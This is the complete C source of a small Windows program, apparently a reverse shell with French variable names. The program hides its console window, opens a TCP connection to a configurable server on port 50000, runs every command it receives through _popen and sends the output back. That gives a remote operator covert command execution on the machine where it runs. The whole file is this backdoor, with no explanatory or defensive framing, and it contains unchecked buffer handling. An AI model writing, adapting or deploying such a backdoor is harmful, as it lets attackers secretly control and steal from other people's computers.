#pragma comment(lib, "ws2_32.lib")
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#define _WIN32_WINNT 0x0500

#include <windows.h>



#define SERVER_IP ""
#define SERVER_PORT 50000

int main(void){
    HWND fenetre = GetForegroundWindow();

    ShowWindow(fenetre, SW_HIDE);
    ShowWindow(fenetre, SW_MINIMIZE);

    WSADATA wsaData;
    SOCKET sock;

    int erreur = WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKADDR_IN adresseServeur;


    char buffer[1024] = "" ;
    if (!erreur){
        sock = socket(AF_INET, SOCK_STREAM, 0);
    }
    adresseServeur.sin_addr.s_addr = inet_addr(SERVER_IP);
    adresseServeur.sin_port = htons(SERVER_PORT);

    adresseServeur.sin_family = AF_INET;
    if (connect(sock, (SOCKADDR *)&adresseServeur, sizeof(adresseServeur)) != SOCKET_ERROR){
        while ( recv(sock, buffer, 999, 0) != SOCKET_ERROR){
            FILE *fp;
            char cmd[1024] = "" ;

            fp = _popen(buffer, "r");
            char buffer2[1024] = "" ;
            while (fgets(cmd, sizeof(cmd) -1 , fp) != NULL){

                strcat(buffer2, cmd);
                
            }
            send(sock, buffer2, strlen(buffer2) +1, 0);

            _pclose(fp);
            
        }
        closesocket(sock);
        WSACleanup();
    }
    return 0;




}


